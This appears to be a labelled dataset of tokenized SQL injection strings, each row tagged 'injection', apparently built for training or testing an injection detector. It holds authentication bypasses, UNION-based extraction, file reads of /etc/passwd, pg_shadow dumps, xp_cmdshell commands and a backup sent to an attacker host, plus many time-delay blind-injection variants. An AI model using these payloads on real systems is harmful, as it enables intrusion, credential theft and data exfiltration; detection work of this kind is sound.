113,SQUT SLSH STAR STAR SLSH OR SLSH STAR STAR SLSH INT SLSH STAR STAR SLSH EQ SLSH STAR STAR SLSH INT,injection
114,â€˜ OR INT EQ INT MINUS MINUS,injection
115,DQUT OR INT EQ INT MINUS MINUS,injection
116,OR INT EQ INT,injection
117,OR INT EQ INT MINUS MINUS,injection
118,OR INT EQ INT OR DQUT DQUT EQ,injection
119,SQUT OR INT EQ INT OR SQUT SQUT EQ SQUT,injection
120,SQUT OR INT IN LPRN SELECT ATR ATR VERSION RPRN MINUS MINUS,injection
121,OR PRCNT INT EQ INT,injection
122,OR PRCNT INT EQ INT MINUS MINUS,injection
123,SQUT OR INT GT INT,injection
124,SQUT OR INT BETWEEN INT AND INT,injection
125,SQUT OR INT EQ INT,injection
126,â€˜ OR INT EQ INT MINUS MINUS,injection
127,SQUT OR SQUT INT SQUT EQ SQUT INT,injection
128,OR A EQ A,injection
129,OR A EQ A,injection
130,SQUT OR SQUT A SQUT EQ SQUT A,injection
131,SQUT OR A EQ A MINUS MINUS,injection
132,SQUT RPRN OR LPRN SQUT A SQUT EQ SQUT A,injection
133,DQUT OR DQUT A DQUT EQ DQUT A,injection
134,RPRN OR LPRN A EQ A,injection
135,ORDER BY,injection
136,SQUT OR LPRN EXISTS RPRN,injection
137,OR ISNULL LPRN INT SLSH INT RPRN SLSH STAR,injection
138,DQUT OR ISNULL LPRN INT SLSH INT RPRN SLSH STAR,injection
139,SQUT OR SQUT something SQUT LIKE SQUT SOME PRCNT SQUT,injection
140,SQUT OR SQUT something SQUT EQ SQUT SOME SQUT PLUS SQUT thing SQUT,injection
141,SQUT OR SQUT TEXT SQUT EQ n SQUT TEXT SQUT,injection
142,SQUT OR SQUT TEXT SQUT GT SQUT T SQUT,injection
143,SQUT OR uid LIKE SQUT PRCNT,injection
144,SQUT OR uname LIKE SQUT PRCNT,injection
145,SQUT OR SQUT unusual SQUT EQ SQUT unusual SQUT,injection
146,SQUT OR userid LIKE SQUT PRCNT,injection
147,SQUT OR USER LIKE SQUT PRCNT,injection
148,SQUT OR username LIKE SQUT PRCNT,injection
149,SQUT OR username LIKE CHAR LPRN INT RPRN SMCLN,injection
150,SQUT OR SQUT whatever SQUT IN LPRN SQUT whatever SQUT RPRN,injection
151,SQUT MINUS MINUS BITAND PASSWORD EQ,injection
152,PASSWORD CLN STAR SLSH EQ INT MINUS MINUS,injection
153,print,injection
154,print ATR ATR variable,injection
155,PROCEDURE,injection
156,REPLACE,injection
157,SELECT,injection
158,SQUT SELECT STAR FROM information_schema DOT TABLES MINUS MINUS,injection
159,SQUT SELECT NAME FROM syscolumns WHERE ID EQ LPRN SELECT ID FROM sysobjects WHERE NAME EQ tablename SQUT RPRN MINUS MINUS,injection
160,SQUT LPRN SELECT top INT,injection
161,MINUS MINUS sp_password,injection
162,SQUT sqlattempt1,injection
163,LPRN sqlattempt2 RPRN,injection
164,SQUT sqlvuln,injection
165,SQUT PLUS sqlvuln,injection
166,LPRN sqlvuln RPRN,injection
167,sqlvuln SMCLN,injection
168,T SQUT EXEC master DOT DOT xp_cmdshell SQUT nslookup www DOT google DOT com SQUT MINUS MINUS,injection
169,to_timestamp_tz,injection
170,TRUNCATE,injection
171,tz_offset,injection
172,SQUT UNION ALL SELECT,injection
173,SQUT UNION ALL SELECT ATR ATR VERSION MINUS MINUS,injection
174,SQUT UNION SELECT,injection
175,uni SLSH STAR STAR SLSH ON sel SLSH STAR STAR SLSH ect,injection
176,SQUT UNION SELECT,injection
177,SQUT UNION SELECT INT CMMA load_file LPRN SQUT SLSH etc SLSH passwd SQUT RPRN CMMA INT CMMA INT CMMA INT SMCLN,injection
178,RPRN UNION SELECT STAR FROM information_schema DOT TABLES SMCLN,injection
179,SQUT UNION SELECT STAR FROM users WHERE login EQ CHAR LPRN INT CMMA INT CMMA INT CMMA INT RPRN SMCLN,injection
180,UPDATE,injection
181,SQUT BITOR BITOR utl_http DOT request,injection
182,CMMA ATR variable,injection
183,ATR variable,injection
184,ATR var SELECT ATR var AS var INTO TEMP END MINUS MINUS,injection
185,BSLSH x27union SELECT,injection
186,x SQUT AND INT EQ LPRN SELECT COUNT LPRN STAR RPRN FROM tabname RPRN SMCLN MINUS MINUS,injection
187,x SQUT AND email IS NULL SMCLN MINUS MINUS,injection
188,x SQUT AND members DOT email IS NULL SMCLN MINUS MINUS,injection
189,x SQUT AND userid IS NULL SMCLN MINUS MINUS,injection
190,x SQUT OR INT EQ INT OR SQUT x SQUT EQ SQUT y,injection
191,x SQUT OR full_name LIKE SQUT PRCNT bob PRCNT,injection
192,ã½ OR INT EQ INT MINUS MINUS,injection
0,SELECT versionnumber CMMA version_timestamp FROM sysibm DOT sysversions SMCLN,injection
1,SELECT USER FROM sysibm DOT sysdummy1 SMCLN,injection
2,SELECT SESSION_USER FROM sysibm DOT sysdummy1 SMCLN,injection
3,SELECT SYSTEM_USER FROM sysibm DOT sysdummy1 SMCLN,injection
4,SELECT CURRENT SERVER FROM sysibm DOT sysdummy1 SMCLN,injection
5,SELECT NAME FROM sysibm DOT systables SMCLN,injection
6,SELECT grantee FROM syscat DOT dbauth SMCLN,injection
7,SELECT STAR FROM syscat DOT tabauth SMCLN,injection
8,SELECT STAR FROM syscat DOT dbauth WHERE grantee EQ CURRENT USER SMCLN,injection
9,SELECT STAR FROM syscat DOT tabauth WHERE grantee EQ CURRENT USER SMCLN,injection
10,SELECT NAME CMMA tbname CMMA coltype FROM sysibm DOT syscolumns SMCLN,injection
11,SELECT schemaname FROM syscat DOT schemata SMCLN,injection
0,SELECT ATR ATR VERSION,injection
1,SELECT ATR ATR servernamee,injection
2,SELECT ATR ATR microsoftversione,injection
3,SELECT STAR FROM master DOT DOT sysserverse,injection
4,SELECT STAR FROM sysusers,injection
5,EXEC master DOT DOT xp_cmdshell SQUT ipconfig PLUS SLSH ALL SQUT,injection
6,EXEC master DOT DOT xp_cmdshell SQUT net PLUS VIEW SQUT,injection
7,EXEC master DOT DOT xp_cmdshell SQUT net PLUS users SQUT,injection
8,EXEC master DOT DOT xp_cmdshell SQUT ping PLUS LT attackerip GT SQUT,injection
9,backup DATABASE master TO disks EQ SQUT BSLSH BSLSH LT attackerip GT BSLSH LT attackerip GT BSLSH backupdb DOT dat SQUT,injection
10,CREATE TABLE myfile LPRN line VARCHAR LPRN INT RPRN RPRN DQUT bulk INSERT foo FROM SQUT C CLN BSLSH inetpub BSLSH wwwroot BSLSH auth DOT aspâ SQUT DQUT SELECT STAR FROM myfile DQUT MINUS MINUS,injection
0,LT username GT SQUT OR INT EQ INT MINUS MINUS,injection
1,SQUT OR SQUT SQUT EQ SQUT allows authentication WITHOUT A VALID username DOT,injection
2,LT username GT SQUT MINUS MINUS,injection
3,SQUT UNION SELECT INT CMMA SQUT LT USER MINUS fieldname GT SQUT CMMA SQUT LT pass MINUS fieldname GT SQUT INT MINUS MINUS,injection
4,SQUT OR INT EQ INT MINUS MINUS,injection
0,CREATE TABLE myfile LPRN INPUT TEXT RPRN SMCLN LOAD DATA INFILE SQUT LT filepath GT SQUT INTO TABLE myfile SMCLN SELECT STAR FROM myfile SMCLN,injection
0,SELECT VERSION LPRN RPRN SMCLN,injection
1,SELECT current_database LPRN RPRN SMCLN,injection
2,SELECT CURRENT_USER SMCLN,injection
3,SELECT SESSION_USER SMCLN,injection
4,SELECT current_setting LPRN SQUT log_connections SQUT RPRN SMCLN,injection
5,SELECT current_setting LPRN SQUT log_statement SQUT RPRN SMCLN,injection
6,SELECT current_setting LPRN SQUT port SQUT RPRN SMCLN,injection
7,SELECT current_setting LPRN SQUT password_encryption SQUT RPRN SMCLN,injection
8,SELECT current_setting LPRN SQUT krb_server_keyfile SQUT RPRN SMCLN,injection
9,SELECT current_setting LPRN SQUT virtual_host SQUT RPRN SMCLN,injection
10,SELECT current_setting LPRN SQUT port SQUT RPRN SMCLN,injection
11,SELECT current_setting LPRN SQUT config_file SQUT RPRN SMCLN,injection
12,SELECT current_setting LPRN SQUT hba_file SQUT RPRN SMCLN,injection
13,SELECT current_setting LPRN SQUT data_directory SQUT RPRN SMCLN,injection
14,SELECT STAR FROM pg_shadow SMCLN,injection
15,SELECT STAR FROM pg_group SMCLN,injection
16,CREATE TABLE myfile LPRN INPUT TEXT RPRN SMCLN,injection
17,COPY myfile FROM SQUT SLSH etc SLSH passwd SQUT SMCLN,injection
18,SELECT STAR FROM myfile SMCLN COPY myfile TO SLSH tmp SLSH test SMCLN,injection
0,RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
1,RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
2,SQUT RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
3,SQUT RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
4,DQUT RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
5,DQUT RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
6,RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
7,RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
8,SQUT RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
9,SQUT RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
10,DQUT RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
11,DQUT RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
12,CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
13,CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
14,SQUT CMMA NULL RPRN PRCNT 20waifor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
15,SQUT CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
16,DQUT CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
17,DQUT CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
18,RPRN CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
19,RPRN CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
20,SQUT RPRN CMMA NULL RPRN PRCNT 20waifor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
21,SQUT RPRN CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
22,DQUT RPRN CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
23,DQUT RPRN CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
24,CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
25,CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
26,SQUT CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
27,SQUT CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
28,DQUT CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
29,DQUT CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
30,RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
31,RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
32,SQUT RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
33,SQUT RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
34,DQUT RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
35,DQUT RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
36,CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
37,CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
38,SQUT CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
39,SQUT CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
40,DQUT CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
41,DQUT CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
42,RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
43,RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
44,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
45,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
46,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
47,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
48,CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
49,CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
50,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
51,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
52,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
53,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
54,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
55,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
56,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
57,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
58,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
59,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
60,CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
61,CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
62,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
63,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
64,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
65,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
66,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
67,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
68,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
69,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
70,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
71,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
72,CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
73,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
74,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
75,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
76,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
77,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
78,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
79,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
80,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
81,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
82,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
83,CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
84,CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
85,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
86,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
87,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
88,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
89,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
90,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
91,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
92,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
93,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
94,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
95,CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
96,CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
97,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
98,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
99,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
100,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
101,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
102,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
